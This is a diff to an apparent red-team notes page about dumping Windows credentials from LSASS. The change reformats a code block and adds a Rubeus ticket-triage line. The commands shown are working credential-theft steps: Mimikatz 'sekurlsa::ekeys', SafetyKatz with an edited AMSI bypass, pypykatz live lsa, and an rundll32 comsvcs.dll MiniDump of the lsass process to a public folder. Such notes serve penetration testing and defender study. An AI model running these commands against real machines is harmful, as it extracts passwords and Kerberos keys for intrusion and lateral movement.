@@ -19,10 +19,11 @@ Some of the credentials can be extracted without touching **LSASS**:
 The Kerberos SSP used by LSASS in order to provide different authentication methods.\
 Therefore, it possible to dump Kerberos encryption keys using `sekurlsa::ekeys`.
 
-```powershell
-# Dump credentials on a local machine using Mimikatz.
-Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 
-
+<pre class="language-powershell"><code class="lang-powershell"><strong># Check tickets that can be dumpes
+</strong>Rubeus.exe triage
+<strong>
+</strong><strong># Dump credentials on a local machine using Mimikatz.
+</strong>Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 
 
 # Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
 # Used evasive-keys to bypass ASMI and has been edited in the source code
@@ -40,8 +41,8 @@ pypykatz.exe live lsa
 # Using comsvcs.dll
 tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
-<lsass process ID> C:\Users\Public\lsass.dmp full 
-```
+&#x3C;lsass process ID> C:\Users\Public\lsass.dmp full 
+</code></pre>
 
 ### Logon Passwords
 
